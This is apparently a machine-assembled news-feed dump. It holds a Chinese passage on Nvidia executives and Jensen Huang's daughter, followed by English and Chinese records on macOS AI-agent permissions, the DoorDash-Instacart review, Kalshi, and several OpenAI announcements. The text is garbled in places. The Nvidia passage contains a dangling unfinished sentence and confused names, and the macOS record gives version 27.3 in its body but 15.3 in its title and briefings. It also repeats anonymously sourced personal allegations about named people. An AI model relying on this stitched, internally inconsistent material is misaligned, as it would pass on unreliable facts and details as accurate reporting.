卡普雷斯在伦敦商学院认识了黄女士，并于 2024 年加入英伟达，并积极参与交易制定。他在公司迅速崛起，目前担任人工智能副总裁。基础设施增长，并参加了与黄先生的执行团队会议。

这三人被视为黄先生的延伸，但黄女士的影响力最大。

黄女士被同事们称为聪明且有天赋的营销人员，她正式担任实体人工智能产品营销高级总监。她以敏锐的洞察力、出色的工作表现以及在公共场合作为公司的出色代表而闻名。

但实际上，她担任父亲的幕僚长，并对英伟达的营销和传播拥有重大影响力。她还参加了他与执行团队的季度会议，定期向公司董事会汇报，并帮助建立了她父亲的名人形象。

大约六年前，英伟达开始使用黄先生的卡通形象进行自我营销，内部称之为“玩具Jensen”。两位知情人士表示，黄女士在2020年加入公司后，敦促公司的营销团队更广泛地使用她父亲的卡通形象。英伟达开始制作印有“玩具Jensen”的徽章，并用一段卡通视频来欢迎新员工。但玩具版Jensen让一些员工感到不安，他们担心这会让英伟达看起来像一个邪教组织。

3月份，在英伟达的开发者大会上，

2025 年 10 月，当《纽约时报》报道 Nvidia 与 Megaspeed 的业务以及黄先生与该公司高管 Alice Huang 的密切关系时，黄先生的女儿向 Nvidia 的公关团队施压，要求其强力反击，同时吸收了 Heller 的支持。 （《泰晤士报》后来报道称，美国情报部门已确定爱丽丝·黄是中国情报人员，并将信息传递给北京。中国否认了这一说法，黄女士尚未回复置评请求。）

黄麦迪逊极力提拔和保护她的父亲。和她父亲一样，黄女士也是出了名的脾气暴躁。三名知情人士表示，有太多员工抱怨黄女士，以至于英伟达的人力资源部门连续几个月要求她开始每周一次的关于她的管理风格的辅导课程。

四位知情人士表示，多年来，黄女士还与该公司首席财务官、现任临时首席执行官克雷斯发生冲突，特别是在她对机器人公司的投资以及卡普雷斯希望与数据中心业务达成的交易方面。

过去三年来，随着她在英伟达内部的权力不断增强，英伟达员工估计，已有十几位关键高管离开了公司，因为他们不喜欢与她共事。

在与其他员工的会议上，黄女士对她的兄弟和管理人员大喊大叫，这些人在名义上是管理她的，或者在组织上高于她的。两位知情人士称，去年年底，当黄女士对英伟达营销团队的其他人大喊大叫时，一位副总裁惊慌失措，不得不把电话留给她。

今年 3 月，在 Nvidia 开发者大会之前，黄女士对公司副总裁、Cuda 发明者伊恩·巴克 (Ian Buck) 进行了猛烈抨击，Cuda 是一种允许使用 Nvidia 芯片来训练人工智能的软件。

一位知情人士称，巴克并未准备向记者通报情况的演示文稿，而是计划即兴创作。黄女士在英伟达的沟通团队面前对他大喊大叫，巴克后来对自己的沟通团队感到不满。 （巴克先生现在被一些人认为是永久接替黄先生的领跑者。）

巴克先生没有回应置评请求。

对于其他员工来说，这次交流证实了他们已经知道的事情：黄女士是她父亲的女儿。

author: MacRumors
article_content:
With the latest macOS 27.3 beta, Apple is giving Mac users more control over the data they share and the access they give to apps, including apps that use AI agents. Apple today informed developers about upcoming changes to the Full Disk Access API and the Device Control and Data Access API.

Apple says developers will need to adjust user onboarding and make sure apps can "gracefully handle" access to a limited set of folders or apps when using the APIs being overhauled.

Apps that use Full Disk Access for disk backup or the new Accessibility settings for assistive technologies can request entitlements to offer the same experience for new installations that they offered before macOS 27.3.

Right now, known apps keep their current experience without an entitlement, and app permissions granted by users prior to macOS 27.3 will remain in effect. Mac users will see these changes when approving new app permission requests, and entitlement details are coming soon.

Last month, Apple said it would add "additional controls" for Full Disk Access on Macs because of the risks posed by AI agents. Apple warned that some developers are using Full Disk Access in ways that can put users at risk, exposing files, mail, messages, browsing history, and more.

title_zh: 苹果macOS 15.3 beta加强AI应用访问权限限制
summary_zh: 苹果在macOS 15.3 beta中升级了全盘访问与设备控制权限接口，要求应用处理更细粒度的授权请求，以防范AI代理潜在的数据安全风险
article_content_zh:
在最新的 macOS 27.3 Beta 版中，Apple 让 Mac 用户能够更好地控制他们共享的数据以及对应用程序（包括使用 AI 代理的应用程序）的访问权限。 Apple 今天向开发者通报了即将对全磁盘访问 API 以及设备控制和数据访问 API 进行的更改。

苹果表示，开发人员需要调整用户入门，并确保应用程序在使用正在检修的 API 时能够“优雅地处理”对一组有限的文件夹或应用程序的访问。

使用完整磁盘访问进行磁盘备份或辅助技术的新辅助功能设置的应用程序可以请求授权，为新安装提供与 macOS 27.3 之前提供的相同体验。

目前，已知的应用程序会保留其当前的体验而无需授权，并且 macOS 27.3 之前的用户授予的应用程序权限将仍然有效。 Mac 用户在批准新的应用程序权限请求时将看到这些更改，并且权利详细信息即将推出。

上个月，苹果表示，由于人工智能代理带来的风险，它将为 Mac 上的全磁盘访问添加“额外控制”。苹果警告称，一些开发人员使用全磁盘访问的方式可能会让用户面临风险，暴露文件、邮件、消息、浏览历史记录等。

ai_analysis.briefing_zh: 苹果通过macOS 15.3测试版更新，针对全盘访问（Full Disk Access）及设备控制与数据访问接口实施了更严格的合规要求。开发者需优化应用引导流程，确保AI代理类应用能处理仅限特定文件夹或应用的访问限制，旨在防范AI工具滥用API权限窃取邮件、历史记录及敏感文件。
ai_analysis.briefing_en: Apple introduced stricter compliance requirements for Full Disk Access and Device Control APIs in the macOS 15.3 beta. Developers must refine onboarding processes to handle granular access permissions, specifically targeting AI agents to mitigate risks of unauthorized data exposure in emails, messages, and browsing history.

elements_zh.where: macOS 15.3操作系统开发环境
elements_zh.what: 强制实施全盘访问权限（Full Disk Access）和设备控制API的升级，引入“选择应用”授权模式
elements_zh.why: 应对AI代理工具过度索取系统权限导致的用户敏感数据泄露风险

elements_en.what: Overhauled Full Disk Access and Device Control APIs, introducing 'Choose Apps' authorization models
elements_en.why: Mitigate data leakage risks posed by AI agents over-requesting system-level permissions

ai_analysis.insight_zh: 此举标志着操作系统底层逻辑正从“信任应用全权访问”向“最小权限原则”的强制性转型，苹果通过技术围栏直接遏制AI代理作为黑盒程序的潜在破坏力。这不仅迫使AI应用开发者调整架构，也进一步巩固了Apple在生态系统合规性上的绝对控制权，使AI产品的部署门槛向系统底层隐私沙盒靠拢。
ai_analysis.insight_en: This shift marks a fundamental transition from full-trust application models to mandatory least-privilege architectures, with Apple using system barriers to contain the potential destructiveness of black-box AI agents. It forces developers to restructure AI workflows while reinforcing Apple's centralized control over ecosystem compliance, pushing AI deployments toward stricter privacy sandboxes.

title: DOJ to review DoorDash-Instacart merger, sources say
title_en: DOJ to review DoorDash-Instacart merger, sources say

inline_images.caption_en: DoorDash and Instacart logos in this illustration. (Photo: REUTERS)

author: Reuters
article_content:
Nov 16 (Reuters) - The US Department of Justice will review DoorDash's proposed acquisition of Instacart, according to two people familiar with the matter, bringing antitrust scrutiny to the multibillion-dollar grocery delivery tie-up.

DoorDash said in October it would buy Instacart in a deal valued at about $17 billion to create a dominant platform for ordering food and household essentials online.

"We can affirm that the Department under President (Donald) Trump's leadership will vigorously enforce antitrust laws across industries," a DOJ spokesperson said, declining to confirm the review of the specific merger.

Spokespeople for the two companies did not immediately respond to requests for comment.

Large mergers and acquisitions in the US are required to undergo review by either the DOJ or the Federal Trade Commission, which have historically split scrutiny based on industry expertise.

But if a deal poses competition problems, authorities can negotiate settlements requiring the sale of assets to competitors, or they can sue in federal court to block it.

DoorDash has agreed to pay Instacart $1.25 billion if the deal does not clear antitrust scrutiny, according to a securities filing.

Among standalone delivery apps, Instacart competes with DoorDash and Uber Eats, both of which have been aggressively expanding into grocery and other retail delivery.

Instacart last year announced a partnership with Grubhub, another food delivery platform, to expand restaurant choices on its app and tap into suburban markets.

DoorDash has touted its lead in grocery and retail, saying in February that it had more of those orders than Instacart.

11月16日（路透社）- 据两位知情人士透露，美国司法部将对 DoorDash 收购 Instacart 的拟议交易展开审查，使这项涉及数百亿美元的生鲜配送合并案面临严格的反垄断监管。

DoorDash 于 10 月宣布拟以约 170 亿美元收购 Instacart，旨在打造一个在全美餐饮外卖与日用品在线配送领域占据主导地位的超级平台。

司法部发言人表示：“我们可以确认，在唐纳德·特朗普总统领导下，司法部将在各行业严格执行反垄断法律。”不过该发言人拒绝就具体并购案置评。

两家公司的发言人均未立即回应路透社的置评请求。

美国大型并购交易依法必须接受司法部或联邦贸易委员会（FTC）的审查，两家监管机构通常依据行业专业分工划分管辖权。

若监管部门认定交易存在妨碍竞争的问题，可以与企业谈判达成要求剥离部分资产的合规协议，也可以直接向联邦法院提起诉讼以叫停交易。

根据监管文件披露，DoorDash 已同意，若该笔并购因未能通过反垄断审查而流产，将向 Instacart 支付高达 12.5 亿美元的“分手费”。

在独立配送应用领域，Instacart 的主要竞争对手包括 DoorDash 和 Uber Eats，后两者近期均在大力向生鲜杂货和其他零售品类配送领域扩张。

Instacart 去年还宣布与另一家外卖平台 Grubhub 建立合作，以扩充其应用内的餐饮选择并进一步渗透郊区市场。

DoorDash 此前大举宣传其在生鲜杂货及零售配送领域的领先优势，曾在 2 月份表示其杂货订单量已超过 Instacart。

title: Kalshi Buys Securities Firm to Expand Into Stock Trading
title_en: Kalshi Buys Securities Firm to Expand Into Stock Trading

inline_images.caption: Kalshi Buys Securities Firm to Expand Into Stock Trading (Source: Wall Street Journal)
inline_images.caption_en: Kalshi Buys Securities Firm to Expand Into Stock Trading (Source: Wall Street Journal)

inline_images.alt: Kalshi Buys Securities Firm to Expand Into Stock Trading

author: Vicky Ge Huang
article_content:
Kalshi, a pioneer in the newfangled prediction markets, is now expanding into one of Wall Street’s oldest businesses: stock trading.

The company bought FB securities, a small New York-based broker, in July and plans to launch equity trading within the next two months, people familiar with the matter said.

The prediction-market platform plans to offer stocks and ETFs within two months as it builds toward a multi-asset exchange

Mon 16 Nov 2026 · 15:23 EST · 3 min read

Kalshi built its name on letting people trade on whether things will happen. Now it wants them trading things that already exist.

The CFTC-regulated prediction-market platform plans to launch stock and ETF trading within two months. The plan follows its acquisition of FB Securities, a broker-dealer based in New York.

Kalshi acquired FB Securities in July 2026. The two-month launch window surfaced in Wall Street Journal reports dated November 16, 2026.

Counting forward from those reports, the research points to a launch that could land around mid-January 2027. That date is an estimate based on the reported window, not a confirmed launch day from the company.

The financial terms of the deal have not been disclosed. Neither Kalshi nor any other party has published a price tag for FB Securities.

The value of the purchase lies less in the brand than in the plumbing. A broker-dealer brings brokerage infrastructure and the regulatory permissions needed to let customers buy and sell stocks and ETFs directly.

For Kalshi, that shortcut matters. Its existing business runs under CFTC oversight, which covers event contracts and derivatives. Offering ordinary equities requires a different set of approvals, and owning a broker-dealer is one way to bring those approvals in-house.

Daily. Free. Join 34,000+ readers across crypto, finance, and policy.

We respect your privacy. Unsubscribe anytime.

Kalshi frames the move as part of a broader effort to become a multi-asset financial exchange. That lineup would combine three categories under one roof.

First come its prediction markets, the core product where users trade contracts tied to real-world outcomes. Second are perpetual futures, derivatives that let traders take positions on price moves without a set expiry date.

Third, if the plan holds, will be traditional equity products: individual stocks and exchange-traded funds. ETFs are baskets of assets that trade like a single share.

The company has the money behind that ambition. Kalshi’s Series G funding round in October 2026 valued it at approximately $40 billion.

Kalshi’s identity has been tied to prediction markets, a format that turns questions about future events into tradable contracts. Prices on those contracts move as traders update their views on how likely an outcome is.

Operating under CFTC regulation has been central to its pitch. It positions Kalshi as a regulated venue rather than an offshore betting site, a distinction that matters to users and to the institutions backing it.

The later addition of perpetual futures already pushed the platform beyond pure event trading. Stocks and ETFs extend that drift further toward the territory of established retail trading platforms.

article_content_zh:
卡尔希是新兴预测市场的先驱，现在正在扩展到华尔街最古老的业务之一：股票交易。

知情人士称，该公司于 7 月收购了纽约小型经纪商 FB Securities，并计划在未来两个月内推出股票交易。

该预测市场平台计划在两个月内提供股票和 ETF，以打造多资产交易所

2026 年 11 月 16 日星期一 · 15:23 美国东部时间 · 阅读 3 分钟

Kalshi 因让人们根据事情是否会发生进行交易而闻名。现在它希望他们交易已经存在的东西。

这个受 CFTC 监管的预测市场平台计划在两个月内推出股票和 ETF 交易。该计划是在收购纽约经纪自营商 FB Securities 后制定的。

Kalshi 于 2026 年 7 月收购了 FB Securities。《华尔街日报》2026 年 11 月 16 日的报道中提到了两个月的启动窗口。

从这些报告来看，研究指出，发射可能会在 2027 年 1 月中旬左右进行。该日期是根据报告的窗口进行的估计，而不是该公司确认的发射日期。

该交易的财务条款尚未披露。 Kalshi 或任何其他方均未公布 FB 证券的价格标签。

购买的价值不在于品牌，而在于管道。经纪自营商带来经纪基础设施和让客户直接买卖股票和 ETF 所需的监管许可。

对于卡尔希来说，这条捷径很重要。其现有业务在美国商品期货交易委员会（CFTC）监管下运营，涵盖事件合约和衍生品。提供普通股票需要一套不同的批准，而拥有经纪自营商是将这些批准纳入内部的一种方式。

日常的。自由的。加入加密货币、金融和政策领域 34,000 多名读者的行列。

我们尊重您的隐私。随时取消订阅。

卡尔希将此举视为成为多资产金融交易所的更广泛努力的一部分。该阵容将三个类别合并在一个屋檐下。

首先是预测市场，这是用户交易与现实世界结果相关的合约的核心产品。其次是永续期货，这是一种衍生品，允许交易者在没有设定到期日的情况下根据价格变动持仓。

第三，如果该计划持有，将是传统股票产品：个股和交易所交易基金。 ETF 是像单一股票一样交易的一篮子资产。

该公司有资金支持这一雄心壮志。 Kalshi 于 2026 年 10 月进行的 G 轮融资估值约为 400 亿美元。

卡尔希的身份与预测市场联系在一起，这种形式将有关未来事件的问题转化为可交易的合约。随着交易者更新他们对结果可能性的看法，这些合约的价格也会发生变化。

在 CFTC 监管下运营一直是其宣传的核心。它将 Kalshi 定位为受监管的场所，而不是离岸博彩网站，这一区别对用户和支持它的机构都很重要。

后来永续合约的加入已经使该平台超越了纯粹的事件交易。股票和 ETF 将这种趋势进一步推向成熟零售交易平台的领域。

title: Strengthening NATO and allied cyber defenses with AI
title_en: Strengthening NATO and allied cyber defenses with AI
author: OpenAI
article_content:
Governments and national cyber agencies protect the systems that people, public services and economies depend on. Through Daybreak, we’re putting advanced AI into the hands of trusted defenders for authorized security work, from reviewing software and investigating suspicious activity to validating vulnerabilities, and developing and testing fixes.

### Strengthening NATO’s cyber defenses

OpenAI works with NATO’s Communications and Information Agency (NCIA) to provide NATO’s core institutions with access to advanced cybersecurity models, helping protect Allied networks. NATO has used up to 300 billion raw input and output tokens per month as part of this work.

NATO’s early use of OpenAI tools shows how capable cyber defenders can put frontier models to work, supporting NATO’s mission of safeguarding the freedom and security of its member states. It also helps strengthen cyber expertise across multinational teams responsible for protecting Allied networks around the clock, and creates lessons that can benefit defenders across Europe and the broader Alliance.

OpenAI also supported the 2026 Crossed Swords exercise. Organized by the NATO Cooperative Cyber Defence Centre of Excellence (CCDCOE), the exercise included a new training stream in which participants built, deployed, and evaluated AI agents for cyber operations, using OpenAI Daybreak in the technical environment. The training put participants alongside AI agents as operators, with an emphasis on maintaining human oversight.

OpenAI remains fully committed to NATO’s principles for responsible AI adoption and to delivering solutions that are safe and secure.

### Supporting allied governments

Beyond NATO, we have already provided access to our cyber models to defenders in Europe, including the EU’s ENISA and national cyber agencies in France (ANSSI), Germany and Poland.

The Ministry of Digital Transformation of Ukraine is using OpenAI’s Daybreak tool to strengthen the cyber defence of civilian infrastructure. The initiative is designed to help Ukrainian teams identify software vulnerabilities and develop and test fixes more quickly, supporting defenders who protect essential services amid persistent cyber attacks.

The EU’s cyber agency, ENISA, used our models to identify four vulnerabilities in software used across EU institutions, with fixes published for all four (1, 2, 3, 4). A November joint report from ENISA and CERT-EU also describes a review of 27 software projects using frontier models including OpenAI models accessed through Daybreak, and tools including the Codex security plug-in. Across the models tested, 95% of the 88 potential issues assessed by software maintainers were confirmed as genuine, demonstrating the value of combining AI with human expertise.

CERT Polska used OpenAI models to help identify six vulnerabilities in MikroTik RouterOS and coordinated their disclosure with the vendor. Researchers directed the work, tested findings on real systems and verified their impact, with AI accelerating analysis and the exploration of potential vulnerabilities. MikroTik released fixes, which CERT Polska confirmed prevented the attacks it had observed, giving network operators a concrete way to protect affected devices.

We will continue working with governments, national cyber agencies and international partners to turn frontier AI capability into stronger, safer, more resilient systems, helping defenders find weaknesses, fix them faster and protect the services people rely on every day.

article_content_zh:
政府和国家网络机构保护人民、公共服务和经济所依赖的系统。通过 Daybreak，我们将先进的人工智能交给值得信赖的防御者来执行授权的安全工作，从审查软件和调查可疑活动到验证漏洞以及开发和测试修复程序。

### 加强北约的网络防御

OpenAI 与北约通信和信息局 (NCIA) 合作，为北约核心机构提供先进的网络安全模型，帮助保护盟军网络。作为这项工作的一部分，北约每月使用多达 3000 亿个原始输入和输出代币。

北约对 OpenAI 工具的早期使用表明，有能力的网络防御者如何将前沿模型付诸实践，支持北约维护其成员国自由和安全的使命。它还有助于加强负责全天候保护盟军网络的跨国团队的网络专业知识，并创造有益于整个欧洲和更广泛联盟的防御者的经验教训。

OpenAI 还支持了 2026 年交叉剑演习。该演习由北约合作网络防御卓越中心 (CCDCOE) 组织，包括一个新的培训流程，参与者在技术环境中使用 OpenAI Daybreak 构建、部署和评估用于网络作战的人工智能代理。培训将参与者与人工智能代理一起作为操作员，重点是维持人类监督。

OpenAI 仍然完全致力于北约负责任地采用人工智能的原则，并提供安全可靠的解决方案。

### 支持盟国政府

除了北约之外，我们已经向欧洲的防御者提供了对我们网络模型的访问，包括欧盟的 ENISA 以及法国 (ANSSI)、德国和波兰的国家网络机构。

乌克兰数字化转型部正在使用 OpenAI 的 Daybreak 工具来加强民用基础设施的网络防御。该计划旨在帮助乌克兰团队更快地识别软件漏洞并开发和测试修复程序，从而支持防御者在持续的网络攻击中保护基本服务。

欧盟网络机构 ENISA 使用我们的模型识别了欧盟机构使用的软件中的四个漏洞，并针对所有四个漏洞（1、2、3、4）发布了修复程序。 ENISA 和 CERT-EU 11 月的联合报告还描述了对使用前沿模型（包括通过 Daybreak 访问的 OpenAI 模型）和 Codex 安全插件等工具的 27 个软件项目的审查。在测试的模型中，软件维护人员评估的 88 个潜在问题中有 95% 被确认为真实问题，这证明了人工智能与人类专业知识相结合的价值。

CERT Polska 使用 OpenAI 模型帮助识别 MikroTik RouterOS 中的六个漏洞，并与供应商协调披露。研究人员指导了这项工作，在真实系统上测试了结果并验证了其影响，人工智能加速了分析和潜在漏洞的探索。 MikroTik 发布了修复程序，CERT Polska 确认修复程序阻止了其观察到的攻击，为网络运营商提供了保护受影响设备的具体方法。

我们将继续与政府、国家网络机构和国际合作伙伴合作，将前沿人工智能能力转变为更强大、更安全、更有弹性的系统，帮助防御者发现弱点，更快地修复它们，并保护人们每天依赖的服务。

title: Introducing OpenAI for Chile
title_en: Introducing OpenAI for Chile
author: OpenAI
article_content:
Today we’re launching OpenAI for Chile, a partnership with the Government of Chile, led by the Ministry of Science, Technology, Knowledge and Innovation, to support responsible AI adoption in public administration, build civil servants’ skills and help local startups develop useful AI applications.

The partnership builds on Chile’s National AI Policy and action plan, which support talent development, research and responsible adoption.

The Memorandum of Understanding was signed on the sidelines of Semafor’s Silicon Valley & The World conference in California, with Minister Ximena Lincolao leading the agreement on behalf of Chile.

The partnership is supported by the U.S. Department of Commerce’s American SI Exports Program, of which OpenAI is an anchor partner, helping Chile advance its own AI ambitions through public sector innovation, skills development, and entrepreneurship.

### Putting AI to work in Chile

The partnership will explore technology adoption in the ministry’s administrative processes, including potential support from OpenAI on adopting new models, alongside advice and training for ministry personnel.

For civil servants, the partnership will explore practical AI literacy, upskilling and reskilling tailored to their roles. Activities could include workshops and a train-the-trainer approach, covering effective use of AI tools, checking outputs, protecting sensitive information and maintaining human oversight.

To support Chile’s AI startup and innovation ecosystem, the partners will explore access to relevant OpenAI programs and technology, practical learning, technical guidance and mentorship. Cooperation could also connect entrepreneurs with public institutions, universities and other local partners to develop applications that support Chile’s economic development and public-service priorities.

A joint task force of ministry and OpenAI representatives is expected to agree priorities and an initial workplan, with leads, milestones and measures of success for each activity.

Specific activities, eligibility, resources and access to technology will be agreed separately. The MoU sets no investment or purchasing commitment. Activities will be subject to appropriate safeguards for privacy, information security and responsible use.

### About OpenAI for Countries

OpenAI for Chile is part of OpenAI for Countries, our global initiative to help countries use AI to advance their national priorities, strengthen their economies and expand opportunity. We work with governments and local partners to turn AI’s potential into practical benefits for their people.

article_content_zh:
今天，我们与智利政府合作，在科学、技术、知识和创新部的领导下，推出了 OpenAI for Chile，以支持在公共管理中负责任地采用人工智能、培养公务员技能并帮助当地初创公司开发有用的人工智能应用程序。

该合作伙伴关系建立在智利国家人工智能政策和行动计划的基础上，该政策和行动计划支持人才开发、研究和负责任的采用。

该谅解备忘录是在加州 Semafor 硅谷与世界会议期间签署的，由 Ximena Lincolao 部长代表智利领导该协议。

该合作伙伴关系得到了美国商务部美国 SI 出口计划的支持，OpenAI 是该计划的主要合作伙伴，帮助智利通过公共部门创新、技能开发和创业精神推进其人工智能雄心。

### 让人工智能在智利发挥作用

此次合作将探索该部委行政流程中的技术采用，包括 OpenAI 对采用新模型的潜在支持，以及为该部委人员提供建议和培训。

对于公务员来说，该合作伙伴关系将探索针对其角色的实用人工智能素养、技能提升和再培训。活动可以包括研讨会和培训师培训方法，涵盖人工智能工具的有效使用、检查输出、保护敏感信息和维持人工监督。

为了支持智利的人工智能创业和创新生态系统，合作伙伴将探索相关 OpenAI 项目和技术、实践学习、技术指导和指导。合作还可以将企业家与公共机构、大学和其他当地合作伙伴联系起来，开发支持智利经济发展和公共服务优先事项的应用程序。

由部委和 OpenAI 代表组成的联合工作组预计将商定优先事项和初步工作计划，其中包括每项活动的领导、里程碑和成功衡量标准。

具体活动、资格、资源和技术获取将另行商定。谅解备忘录未做出任何投资或采购承诺。活动将受到适当的隐私、信息安全和负责任使用保障措施的约束。

智利 OpenAI 是国家 OpenAI 的一部分，这是我们的全球倡议，旨在帮助各国利用人工智能推进其国家优先事项、增强经济并扩大机会。我们与政府和当地合作伙伴合作，将人工智能的潜力转化为造福人民的实际利益。

article_content:
Our latest model configuration earned leading marks on multiple benchmarks. Every ChatGPT Enterprise customer can now request access.

Today, we're releasing an updated Astra for Law that is state-of-the-art on Harvey LAB-AA and a top performer on Vals AI’s Legal Research Bench. We are also enabling all ChatGPT Enterprise customers to request access through the Trusted Access Program, including through the API.

Astra for Law is a model configuration of GPT‑6.2 Astra, our latest, most powerful frontier model. It pairs GPT‑6.2 Astra with an expanded legal search index and instructions for researching a question, weighing the authorities, and writing the answer. Today’s configuration earned full credit on the LAB-AA tests nearly 40% more often than did the runner-up, GPT‑6.2 Astra.

Since we introduced Astra for Law in September to a small group of firms, including Cooley, Ropes & Gray, and Sullivan & Cromwell, our research team has made rapid innovations to improve its legal reasoning and expand its legal search index by over a third. On Vals AI’s Legal Research Bench, the share of research answers that passed every check rose from about 46% to 53.8% in less than two months.

As the world grows more complex, lawyers occupy an increasingly important role. They shape nearly every system we rely on: they negotiate the agreements that move commerce, defend people’s rights in courts, and draft the laws we all live by. That’s why we’ve made law a research priority at OpenAI: to put the best intelligence in the hands of the best lawyers.

### First in the Harvey LAB-AA

Harvey’s Legal Agent Benchmark (LAB) tests whether a model can take a legal assignment from start to finish. LAB-AA is Artificial Analysis’s version of that test. It tests the models on 120 assignments developed by Harvey across 24 areas of law – everything from drafting deposition outlines to reviewing commercial leases to strategizing ownership changes in acquisitions. To earn full credit, an answer must meet every requirement of an assignment without hallucinating, i.e., making a material claim that is not supported by the source documents.

Astra for Law ranked first, earning full credit on 20.8% of assignments, ahead of GPT‑6.2 Astra at 15.0% and Muse Wonder Full at 13.1%.

Astra for Law also earned that top score with 54% less output per assignment than the highest-scoring non-OpenAI model in the evaluation, averaging about 64,000 output tokens per assignment, compared with 139,000 for Muse Wonder Full. For legal teams paying by usage, this can mean the difference between staying within budget and blowing through it.

### 95% fewer hallucinations per assignment than Claude Opus 5.5

Hallucinations are unacceptable in legal work. A single invented citation can cost a lawyer a client’s trust, credibility in court, and a reputation built over years. That’s why reducing hallucinations has been a priority for Astra for Law. In Artificial Analysis’s latest LAB-AA comparison, Astra for Law tied (with GPT‑6) for the lowest rate of material hallucinations: 0.03 per assignment, compared with 0.59 for Claude Opus 5.5 (the next lowest non-OpenAI model). Notably, Astra for Law's performance on this eval included zero material hallucinations for tasks that met the all-pass criteria.

Across the same 120 assignments, Artificial Analysis counted hallucinated claims that could mislead a reader on a substantive point. Astra for Law averaged 0.03 such errors per assignment, tied for the lowest rate in the comparison and roughly half the rate for regular GPT‑6.2 Astra (0.06).

Every OpenAI configuration tested had fewer hallucinations than Claude Opus 5.5, the best non-OpenAI result on this measure. Opus 5.5 averaged 0.59 material hallucinations per assignment, about 20 times as many as Astra for Law.

### A top performer on the Vals AI Legal Research Bench

We've made law a research priority at OpenAI, dedicating a team of researchers to accelerate innovation for frontier legal intelligence. One early measure of their progress comes from Vals AI’s Legal Research Bench, where practicing lawyers set questions about U.S. federal and state law. An answer has to cover every required point and pass the source checks. In September, Astra for Law earned full credit on about 46% of questions. In Vals AI’s November 16 evaluation, it earned full credit on 112 of 208 questions (53.8%), a gain of about eight percentage points in under two months. Across all questions, it earned 90.9% of the available points, including partial credit.

Building Astra for Law as a model configuration lets us stay on the bleeding edge of the frontier, in this case GPT‑6.2 Astra. On top of this foundation, we iteratively refine Astra for Law’s specific settings and instructions in response to practitioner feedback, teaching it how to reason and write like a seasoned lawyer. We also continuously hone its tools, such as the legal search index. Since September, we’ve grown the index by 34%, adding over 80 million new URLs, including across international jurisdictions such as the UK, Australia, and Canada. Today, the updated index spans over 310 million URLs and covers more than 99.9% of published U.S. precedential case law.

The chart below shows how the model configuration takes advantage of both the speed of frontier innovation and builds on top of that the specific requirements that make it powerful for lawyers. On Harvey’s own Legal Agent Benchmark, GPT‑6 Astra met every requirement on 4.6% of assignments. GPT‑6.2 Astra tripled performance, completing 14.6% under the same conditions. With the legal configuration, that rose to 16.2%, completing 11% more questions than GPT‑6.2 Astra.

### How lawyers are using Astra for Law

The most interesting possibilities for Astra for Law are being shaped by the lawyers who are using it for their day-to-day work. Across law firm customers and OpenAI’s own legal team, early users are building references around their practice, inviting tougher challenges to their arguments, and finding new ways to respond to changing legislation.

For example, early users at OpenAI are using Astra for Law to:

Give your argument its strongest opponent. A common use for Astra for Law is as a sparring partner. A competition lawyer gives it a reading of a statute and asks it to argue the other side, drawing on legislative history, court decisions, and versions of the law in other languages.

Find the line between a recommendation and a requirement. A policy lawyer looking at a proposed oversight bill wanted to know how much power an independent reviewer would have. If the reviewer called for a fix, would the developer have to make it? For questions like these, the lawyer puts a plain-English account of each obligation beside the bill’s exact words, so she can make fast judgment calls about which reading the text supports.

Start the first call with outside counsel on the hardest question. When the business is considering entering an unfamiliar industry, a product lawyer uses Astra for Law to map which rules would apply to the proposed activity. Instead of spending the first call asking for high-level advice, the lawyer can bring outside counsel what’s actually at issue.

Turn a stack of policies into a workflow. A legal program manager used Astra for Law to turn regulatory procedures and company policy into a workflow for colleagues handling incoming cases, enabling them to automate when to ask for more information, when to close the case, and when to escalate it to a lawyer.

Build the guide you wish came with the statute. A competition lawyer paired Astra for Law with ChatGPT’s site-building tools to annotate legislation the team uses regularly. A colleague reading a provision can hover over a term for its definition, follow a link to the materials that explain it, and see what the team advised the last time that provision came up.

### Bring Astra for Law to your practice

Starting today, every ChatGPT Enterprise customer can request Astra for Law through the Trusted Access Program in the admin console. If your team already has access, select gpt-6.2-astra-law in ChatGPT. Customers can also request API access to build Astra for Law into their own tools using this form.

The legal profession is at an inflection point. As technology changes what businesses can do and the world becomes increasingly complex and interconnected, lawyers have an unprecedented opportunity to shape how we make sense of the moment, not just for the businesses they advise but for all of us who live by the rules they help write.

We believe the best lawyers, equipped with the best intelligence, can meet that moment. We’re only at the beginning. We can’t wait to see where you take the profession.

article_content_zh:
我们最新的型号配置在多个基准测试中获得了领先分数。每个 ChatGPT Enterprise 客户现在都可以请求访问权限。

今天，我们发布了更新版的 Astra for Law，它在 Harvey LAB-AA 上是最先进的，也是 Vals AI 法律研究平台上表现最好的。我们还允许所有 ChatGPT Enterprise 客户通过可信访问计划（包括通过 API）请求访问。

Astra for Law 是我们最新、最强大的前沿模型 GPT-6.2 Astra 的模型配置。它将 GPT-6.2 Astra 与扩展的法律搜索索引以及研究问题、权衡权威和撰写答案的说明相结合。今天的配置在 LAB-AA 测试中获得满分的频率比亚军 GPT‑6.2 Astra 高出近 40%。

自从我们于 9 月份向一小部分公司（包括 Cooley、Ropes & Gray 和 Sullivan & Cromwell）推出 Astra for Law 以来，我们的研究团队迅速进行了创新，以改进其法律推理并将其法律搜索索引扩大了三分之一以上。在 Vals AI 的法律研究平台上，通过每项检查的研究答案的比例在不到两个月的时间内从约 46% 上升至 53.8%。

随着世界变得越来越复杂，律师扮演着越来越重要的角色。他们塑造了我们所依赖的几乎每一个体系：他们谈判推动商业发展的协议，在法庭上捍卫人民的权利，并起草我们赖以生存的法律。这就是为什么我们将法律作为 OpenAI 的研究重点：将最好的情报交给最好的律师。

### 哈维 LAB-AA 中的第一名

哈维的法律代理基准 (LAB) 测试模型是否可以自始至终承担法律任务。 LAB-AA 是该测试的人工分析版本。它在 Harvey 开发的 24 个法律领域的 120 项任务中测试了模型——从起草证词大纲到审查商业租赁，再到制定收购中所有权变更的策略。为了获得满分，答案必须满足作业的所有要求，而不能产生幻觉，即提出不受源文件支持的实质性主张。

Astra for Law 排名第一，20.8% 的作业获得满分，领先于 GPT-6.2 Astra 的 15.0% 和 Muse Wonder Full 的 13.1%。

Astra for Law 也获得了最高分，每次作业的输出比评估中得分最高的非 OpenAI 模型少了 54%，平均每次作业约 64,000 个输出标记，而 Muse Wonder Full 的输出标记为 139,000 个。对于按使用量付费的法律团队来说，这可能意味着保持在预算之内和超出预算之间的区别。

### 每次作业的幻觉比 Claude Opus 5.5 减少 95%

